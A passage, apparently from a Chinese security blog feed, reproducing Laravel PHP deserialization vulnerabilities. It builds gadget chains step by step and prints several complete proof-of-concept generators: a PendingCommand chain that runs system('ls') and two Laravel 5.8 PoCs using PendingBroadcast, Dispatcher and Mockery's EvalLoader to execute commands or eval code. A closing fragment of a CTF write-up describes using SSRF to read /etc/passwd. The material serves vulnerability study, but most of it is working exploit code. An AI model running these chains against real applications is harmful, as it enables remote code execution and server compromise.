<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcmd</span> = <span class="keyword">new</span> <span class="title class_">PendingCommand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcmd</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231212202134564.png?imageSlim" alt="image-20231212202134564"></p>
<p>发现 app 成员属性还没定义，找到声明：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The application instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> \Illuminate\Foundation\Application</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造如下数据包进行测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcmd</span> = <span class="keyword">new</span> <span class="title class_">PendingCommand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcmd</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错如下，提示 Illuminate\Contracts\Console\Kernel 类是不可实例化的：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231212203104509.png?imageSlim" alt="image-20231212203104509"></p>
<p>进行回溯，首先理解 Laravel 服务容器一个特性。在 PHP 中，类本身通常不能直接当作数组使用。但在 Laravel 框架的上下文中，当你看到像 <code>$this-&gt;app[Kernel::class]</code> 这样的代码，它其实是在利用 PHP 的数组访问语法来从服务容器中解析服务。这是 Laravel 服务容器的一个特性，而不是标准 PHP 的行为。下面解释这个机制：</p>
<ol>
<li><strong>服务容器（Service Container）：</strong><ul>
<li>Laravel 的服务容器是一个用于依赖注入的强大工具。它允许你将各种服务（如类实例）绑定到容器中，并在需要时从容器中解析出这些服务。</li>
</ul>
</li>
<li><strong>数组访问接口（ArrayAccess Interface）：</strong><ul>
<li>Laravel 的服务容器实现了 PHP 的 <code>ArrayAccess</code> 接口。这个接口允许对象像数组那样被访问。</li>
<li>实现 <code>ArrayAccess</code> 接口意味着你可以使用数组语法来获取（<code>offsetGet</code>）、设置（<code>offsetSet</code>）、检查（<code>offsetExists</code>）和移除（<code>offsetUnset</code>）对象的元素。</li>
</ul>
</li>
<li><strong>在 Laravel 中使用数组语法：</strong><ul>
<li>当你使用像 <code>$this-&gt;app[Kernel::class]</code> 这样的代码时，你实际上是在调用服务容器的 <code>offsetGet</code> 方法。<code>Kernel::class</code> 作为一个键，传递给这个方法，返回对应的服务实例。</li>
<li>这种语法提供了一种便捷的方式来从容器中检索服务，而不是使用更长的方法调用（例如 <code>$this-&gt;app-&gt;make(Kernel::class)</code>）。</li>
</ul>
</li>
</ol>
<p>所以实际上报错是在实例化 Kernel::class 的时候发生了错误。下述代码的 $abstract 的值就是类 Kernel::class，也就是 Illuminate\Contracts\Console\Kernel。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$abstract</span>, <span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$abstract</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAlias</span>(<span class="variable">$abstract</span>);</span><br><span class="line">   </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;deferredServices[<span class="variable">$abstract</span>]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;instances[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadDeferredProvider</span>(<span class="variable">$abstract</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">make</span>(<span class="variable">$abstract</span>, <span class="variable">$parameters</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$abstract</span>, <span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resolve</span>(<span class="variable">$abstract</span>, <span class="variable">$parameters</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	<span class="comment">// ...</span></span><br><span class="line">  	</span><br><span class="line">    <span class="variable">$concrete</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConcrete</span>(<span class="variable">$abstract</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isBuildable</span>(<span class="variable">$concrete</span>, <span class="variable">$abstract</span>)) &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">build</span>(<span class="variable">$concrete</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make</span>(<span class="variable">$concrete</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExtenders</span>(<span class="variable">$abstract</span>) <span class="keyword">as</span> <span class="variable">$extender</span>) &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable">$extender</span>(<span class="variable">$object</span>, <span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>resolve 函数最终会返回给我们一个类然后去执行 call 函数，出错在 build 函数中，首先要搞清楚 concrete 成员变量的值，看一下 getConcrete 函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span>(<span class="params"><span class="variable">$abstract</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">is_null</span>(<span class="variable">$concrete</span> = <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getContextualConcrete</span>(<span class="variable">$abstract</span>))) &#123;	<span class="comment">// false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">&#x27;concrete&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$abstract</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题是 bindings 怎么控制呢，想了好久没有想通，后来看到上面的这串代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">make</span>(<span class="variable">$abstract</span>, <span class="variable">$parameters</span>);</span><br></pre></td></tr></table></figure>

<p>发现 bindings 所在的类是 Container，是 Application 的父类，而且 bindings 的类型是保护型，也就是说我们控制 Application，就能够控制 bindings，接下来就能控制传入 build 函数的参数，看一下 build：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="variable language_">$this</span>, <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getLastParameterOverride</span>());</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="variable">$reflector</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$concrete</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$reflector</span>-&gt;<span class="title function_ invoke__">isInstantiable</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">notInstantiable</span>(<span class="variable">$concrete</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在目标就很明确了，找到一个可实例化的能执行 call 函数的类，然后序列化给 bindings。</p>
</li>
<li><p>在 Container 类中发现了 call 方法的真实实现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$parameters</span> = [], <span class="variable">$defaultMethod</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">BoundMethod</span>::<span class="title function_ invoke__">call</span>(<span class="variable">$this</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>, <span class="variable">$defaultMethod</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造如下数据包进行测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] =</span><br><span class="line">                [<span class="string">&#x27;concrete&#x27;</span> =&gt; <span class="string">&#x27;Illuminate\Container\Container&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcmd</span> = <span class="keyword">new</span> <span class="title class_">PendingCommand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcmd</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行命令：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231213164022278.png?imageSlim" alt="image-20231213164022278"></p>
</li>
</ol>
<p>关于 5.8 版本的漏洞复现，直接搬砖了。</p>
<p>Poc1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>\<span class="title class_">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection=<span class="keyword">new</span> <span class="title class_">MockDefinition</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>\<span class="title class_">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> <span class="title class_">EvalLoader</span>(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&lt;?php phpinfo();exit()?&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">MockConfiguration</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&quot;feng&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Poc2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span> = &#x27;<span class="title class_">ls</span>&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会报错，其实用burp抓包就能看到了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231213205251550.png?imageSlim" alt="image-20231213205251550"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231213205311185.png?imageSlim" alt="image-20231213205311185"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 渗透测试3</title>
    <url>/2023/12/05/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953/</url>
    <content><![CDATA[<h2 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h2><p>尝试扫描目录和端口，发现只开启了80端口，目录也没扫出什么东西。在主页抓包试试，发现POST了一个url，判断应该存在ssrf，读&#x2F;etc&#x2F;passwd试试看，成功了。</p>
